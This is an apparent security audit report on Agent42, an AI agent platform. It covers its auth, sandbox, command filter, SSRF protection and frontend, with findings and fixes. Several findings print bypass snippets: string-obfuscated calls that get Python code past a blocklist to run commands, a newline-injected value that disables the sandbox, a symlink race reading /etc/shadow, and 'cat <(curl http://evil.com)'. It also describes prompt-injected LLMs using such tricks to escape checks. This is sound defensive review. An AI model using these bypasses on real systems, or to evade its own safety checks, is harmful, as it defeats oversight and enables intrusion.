# Agent42 Security Review Report

**Date:** 2026-02-28
**Scope:** Full codebase security audit — authentication, authorization, sandboxing,
command filtering, network security, tool execution, secrets management, and frontend.

---

## Executive Summary

Agent42 has a **solid, defense-in-depth security architecture** with 8 distinct security
layers. The codebase demonstrates strong security awareness with proper bcrypt hashing,
JWT auth, sandbox enforcement, command filtering, SSRF protection, credential redaction,
and restrictive Docker defaults.

**Overall Risk:** MODERATE — No critical vulnerabilities found, but several medium-severity
issues warrant attention, particularly around IP spoofing, race conditions, and
environment variable injection via the settings endpoint.

---

## Findings

### HIGH Severity

#### H1. Rate Limiting Bypassed via IP Spoofing (dashboard/server.py:555)

**Location:** `dashboard/server.py` lines 443, 555, 588

The login, setup, and password-change endpoints use `request.client.host` for rate
limiting. Behind a reverse proxy (nginx), this will be the proxy's IP (127.0.0.1),
making the per-IP rate limit ineffective — all users share a single bucket.

The server does NOT read `X-Forwarded-For` or `X-Real-IP` headers, which is correct
for direct access but breaks rate limiting when deployed behind nginx (the recommended
production deployment).

**Risk:** An attacker behind the same proxy can brute-force passwords without meaningful
rate limiting since all requests appear from the same IP.

**Remediation:**
- Add a `TRUSTED_PROXY` setting. When set, extract client IP from `X-Forwarded-For` (last
  untrusted hop), otherwise use `request.client.host`.
- Consider adding account lockout after N failed attempts (currently only 60-second window).

---

#### H2. `_update_env_file` Lacks Newline Injection Sanitization (dashboard/server.py:238)

**Location:** `dashboard/server.py` lines 238-274

The `_update_env_file()` function writes user-supplied values directly into `.env` without
sanitizing newlines. A malicious admin could inject additional env vars:

```
value = "safe_value\nSANDBOX_ENABLED=false"
```

This would write a second line into `.env`, potentially disabling security controls.

While this requires admin authentication, it circumvents the explicit exclusion of
security-critical settings from `_DASHBOARD_EDITABLE_SETTINGS`.

**Risk:** An authenticated admin (or attacker with stolen JWT) could disable sandbox,
change JWT secret, or modify password hash by injecting newlines into settings values.

**Remediation:**
```python
# In _update_env_file or the settings endpoint:
for key, value in updates.items():
    if "\n" in value or "\r" in value:
        errors.append(f"{key}: value must not contain newlines")
        continue
```

---

#### H3. WebSocket Token in Query String Logged/Cached (dashboard/server.py:1382)

**Location:** `dashboard/server.py` line 1382

WebSocket auth passes the JWT/API key as a query parameter (`?token=<jwt>`). This is a
common pattern for WebSocket auth since headers aren't supported in the browser WebSocket
API, but it means:

1. The token appears in server access logs
2. The token appears in browser history
3. Intermediate proxies may log/cache it

**Risk:** Token leakage through logs and proxy caches could enable session hijacking.

**Remediation:**
- Use short-lived, single-use WebSocket tickets: client requests a ticket via authenticated
  REST endpoint, passes ticket in WS query param, server validates and invalidates the
  ticket immediately.
- Alternatively, document the risk and ensure nginx config strips query params from
  access logs.

---

### MEDIUM Severity

#### M1. `python_exec.py` Safety Bypass via String Encoding (tools/python_exec.py:25-45)

**Location:** `tools/python_exec.py` lines 25-45

The dangerous pattern blocklist uses simple regex matching on the source code string.
This can be bypassed via:

```python
# Bypass \bsubprocess\b with string concatenation:
s = __builtins__.__dict__["__imp" + "ort__"]("sub" + "process")
s.run(["whoami"])

# Bypass via getattr:
import os
getattr(os, "sys" + "tem")("whoami")

# Bypass via globals/builtins:
globals()["__builtins__"]["__import__"]("os").system("id")
```

**Risk:** The LLM-generated code could (intentionally or via prompt injection) bypass
the static pattern check and execute arbitrary commands.

**Remediation:**
- Use `ast.parse()` to walk the AST and detect dangerous imports/calls structurally
- Run Python code in a restricted namespace (e.g., `RestrictedPython`)
- Consider using Docker containers for code execution (DockerTool already has excellent
  hardening: `--cap-drop=ALL`, `--network=none`, `--read-only`, `--pids-limit=50`)
- Add `getattr`, `globals()`, `builtins`, `vars()`, `dir()` to the blocklist

---

#### M2. TOCTOU Race in Sandbox Path Resolution (core/sandbox.py:47-70)

**Location:** `core/sandbox.py` lines 47-70

The sandbox resolves and validates paths, then returns the resolved path for subsequent
use. Between validation and use, the filesystem could change (symlink created, file
replaced), creating a time-of-check-time-of-use (TOCTOU) race condition.

```python
# Thread 1: resolve_path("safe_file") -> /workspace/safe_file ✓
# Thread 2: ln -sf /etc/shadow /workspace/safe_file
# Thread 1: open("/workspace/safe_file") -> reads /etc/shadow
```

**Risk:** In a multi-agent scenario, one agent could create a symlink that another agent
follows, escaping the sandbox.

**Remediation:**
- Use `O_NOFOLLOW` flag when opening files to refuse symlinks at open-time
- Use `os.open()` with `O_NOFOLLOW` then `os.fdopen()` for file operations
- Re-validate the resolved path immediately before each file operation

---

#### M3. Shell Tool Uses `create_subprocess_shell` (tools/shell.py:154)

**Location:** `tools/shell.py` line 154

The shell tool uses `asyncio.create_subprocess_shell()` which invokes `/bin/sh -c`,
allowing shell metacharacters. While the CommandFilter catches many dangerous patterns,
the deny-list approach has inherent gaps. Any new shell feature or encoding trick not
in the deny list would pass through.

The command filter blocks `eval`, backticks, `$()` with dangerous commands, and `sh -c`,
but some bypass vectors exist:

```bash
# Unicode/locale tricks (if system supports it)
# Heredocs are blocked, but process substitution may not be:
cat <(curl http://evil.com)  # process substitution
```

**Risk:** Novel command injection bypasses could escape the deny-list filter.

**Remediation:**
- For maximum security, consider switching to `create_subprocess_exec` with explicit
  argument splitting (breaks pipe support but eliminates shell injection)
- Add process substitution `<(` and `>(` patterns to the deny list
- Consider the allowlist mode (`COMMAND_FILTER_MODE=allowlist`) as the default for
  production deployments

---

#### M4. Dynamic Tool Code Safety Check Insufficient (tools/dynamic_tool.py:275)

**Location:** `tools/dynamic_tool.py` line 275

Dynamic tools reuse `PythonExecTool._check_code_safety()` which has the same bypass
vectors as M1. Additionally, dynamic tool code persists for the session lifetime —
once created, the tool can be called repeatedly without re-validation.

**Risk:** A prompt-injected LLM could create a dynamic tool with obfuscated malicious
code that passes the static regex check, then use it repeatedly.

**Remediation:**
- Apply the same AST-based analysis recommended in M1
- Add `MAX_DYNAMIC_TOOLS` to the settings (currently hardcoded to 10)
- Log all dynamic tool creation with full code for audit

---

#### M5. Dashboard Settings Endpoint Can Modify `CORS_ALLOWED_ORIGINS` and `DASHBOARD_HOST` (dashboard/server.py:226-227)

**Location:** `dashboard/server.py` lines 206-235

`CORS_ALLOWED_ORIGINS` and `DASHBOARD_HOST` are in `_DASHBOARD_EDITABLE_SETTINGS`,
meaning an authenticated admin can change them via the REST API. An attacker with a
stolen JWT could:

1. Set `CORS_ALLOWED_ORIGINS` to `*` or attacker-controlled domain
2. Set `DASHBOARD_HOST` to `0.0.0.0` to expose the dashboard publicly

These are security-sensitive settings that should require password re-verification or
be excluded from the editable set.

**Risk:** Token theft leads to full dashboard exposure and CORS bypass.

**Remediation:**
- Remove `DASHBOARD_HOST` and `CORS_ALLOWED_ORIGINS` from `_DASHBOARD_EDITABLE_SETTINGS`
- Or require password re-verification for security-sensitive settings changes

---

#### M6. In-Memory Rate Limit State Lost on Restart (dashboard/auth.py:56)

**Location:** `dashboard/auth.py` line 56

Login rate limiting uses an in-memory dict (`_login_attempts`). On server restart, all
rate limit state is lost, allowing an attacker to trigger a restart (e.g., by causing
an OOM) and immediately brute-force without rate limits.

**Risk:** Rate limit bypass via service restart.

**Remediation:**
- Persist rate limit state (Redis if available, file-based fallback)
- Add exponential backoff or account lockout after consecutive failures

---

### LOW Severity

#### L1. MCP Server Environment Leakage (tools/mcp_client.py:142)

**Location:** `tools/mcp_client.py` line 142

MCP server subprocesses inherit the full `os.environ` (with overrides applied). Unlike
`PythonExecTool._safe_env()` which strips secret-containing env vars, MCP servers
receive all API keys, JWT secrets, and passwords.

**Risk:** A malicious or compromised MCP server could exfiltrate API keys and secrets
from the environment.

**Remediation:**
- Apply the same `_safe_env()` filtering used by PythonExecTool
- Or maintain a separate MCP-safe env that includes only necessary variables

---

#### L2. Frontend XSS via `innerHTML` with Template Literals (dashboard/frontend/dist/app.js)

**Location:** `dashboard/frontend/dist/app.js` (55+ innerHTML assignments)

The frontend extensively uses `innerHTML` with template literals. It has an `esc()`
function that properly HTML-encodes strings. Spot-checking shows consistent usage of
`esc()` for user-controlled data, but the sheer volume (55+ innerHTML sites) makes it
likely that some insertion points may miss escaping.

Example of proper usage: `${esc(b)}` in branch select (line 1202)

**Risk:** If any user-controlled string (task title, description, tool output) bypasses
`esc()`, stored XSS is possible.

**Remediation:**
- Audit all innerHTML assignments for unescaped user data
- Consider migrating to a framework with automatic escaping (React, Vue, Svelte)
- At minimum, add CSP `script-src` nonce-based policy (current policy allows
  `'unsafe-inline'` which enables XSS exploitation)

---

#### L3. Device API Key Hash Uses SHA-256 Without Salt (core/device_auth.py:189)

**Location:** `core/device_auth.py` line 189

Device API keys are hashed with plain SHA-256 without a salt. While API keys are
high-entropy random values (not user-chosen passwords), unsalted hashing means identical
keys produce identical hashes, and a leaked hash file could be attacked with rainbow tables.

**Risk:** Low — API keys are 32-byte `token_urlsafe` (256 bits of entropy), making
brute-force impractical regardless of hashing scheme.

**Remediation:**
- Consider using HMAC-SHA256 with a server-side key for defense in depth
- Or use bcrypt for consistency with password hashing

---

#### L4. `_pip_install` Allows Arbitrary Package Installation (dashboard/server.py:45-84)

**Location:** `dashboard/server.py` lines 45-84

The `_pip_install()` function is called from the setup wizard and package install
endpoint. While these endpoints require authentication, the function installs arbitrary
pip packages without validation against an allowlist.

**Risk:** An authenticated attacker could install a malicious pip package containing
arbitrary code that runs at install time (via `setup.py`).

**Remediation:**
- Restrict to a known-safe package allowlist for the setup wizard
- For the general install endpoint, add a warning/confirmation step

---

### INFORMATIONAL

#### I1. Strong Docker Hardening (tools/docker_tool.py:187-211)

The Docker tool applies excellent security defaults:
- `--network=none` — no network access
- `--memory=256m` — memory limit
- `--cpus=0.5` — CPU limit
- `--pids-limit=50` — prevents fork bombs
- `--read-only` with limited tmpfs
- `--cap-drop=ALL` — drops all Linux capabilities
- `--security-opt=no-new-privileges:true`
- Workspace mounted read-only

**Assessment:** Exemplary container security configuration.

---

#### I2. Proper Credential Redaction in Shell Output (tools/shell.py:28-49)

The shell tool redacts AWS keys, GitHub tokens, Slack tokens, passwords, API keys,
and database URLs from command output using regex patterns.

**Assessment:** Good defense-in-depth measure.

---

#### I3. SSRF Protection is Comprehensive (core/url_policy.py:22-36)

Blocks all RFC 1918 private ranges, link-local, loopback, and IPv6 equivalents including
IPv4-mapped IPv6 addresses (::ffff:x.x.x.x). DNS resolution is performed and checked
against blocked ranges.

**Minor gap:** DNS rebinding attacks could bypass this if a hostname resolves to a public
IP during the check but a private IP on the subsequent connection. The URL is only
resolved once; the actual HTTP client may re-resolve. Consider pinning the resolved IP
for the connection.

---

#### I4. Key Store File Permissions (core/key_store.py:67)

The key store correctly sets file permissions to `0600` (owner read/write only) after
writing API keys.

**Assessment:** Good practice for secrets storage.

---

#### I5. Security Headers Are Comprehensive (dashboard/server.py:87-100)

- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Referrer-Policy: strict-origin-when-cross-origin`
- CSP with frame-ancestors 'none'

**Note:** Missing `Strict-Transport-Security` (HSTS) header. This is acceptable since
the dashboard binds to `127.0.0.1` by default and relies on nginx for TLS termination.
The nginx config should add HSTS.

---

## Security Architecture Summary

| Layer | Component | Status | Notes |
|-------|-----------|--------|-------|
| Authentication | bcrypt + JWT | **Strong** | Proper bcrypt, constant-time comparison for fallback |
| Authorization | `require_admin` / `get_auth_context` | **Strong** | Device vs admin separation |
| Rate Limiting | Per-IP sliding window | **Adequate** | Bypassed behind proxy (H1) |
| Sandbox | `WorkspaceSandbox` | **Strong** | Symlink defense, null byte blocking |
| Command Filter | 6-layer filtering | **Strong** | Comprehensive deny patterns |
| SSRF Protection | `UrlPolicy` with IP checks | **Strong** | Full private range blocking |
| Secrets Management | Env stripping, redaction, 0600 perms | **Good** | MCP env leakage (L1) |
| Docker Isolation | Hardened container config | **Excellent** | Best-in-class defaults |
| Frontend | HTML escaping via `esc()` | **Adequate** | Manual escaping, high volume |
| CSP | script-src 'unsafe-inline' | **Weak** | Required for inline handlers |

---

## Recommendations Priority

1. **H2** — Add newline sanitization to `_update_env_file` (quick fix, high impact)
2. **H1** — Add trusted proxy IP parsing for rate limiting
3. **M1/M4** — Replace regex-based code safety with AST analysis
4. **M5** — Remove security-sensitive settings from dashboard-editable set
5. **M3** — Add process substitution patterns to command filter deny list
6. **H3** — Implement short-lived WebSocket auth tickets
7. **L1** — Apply secret stripping to MCP subprocess environments
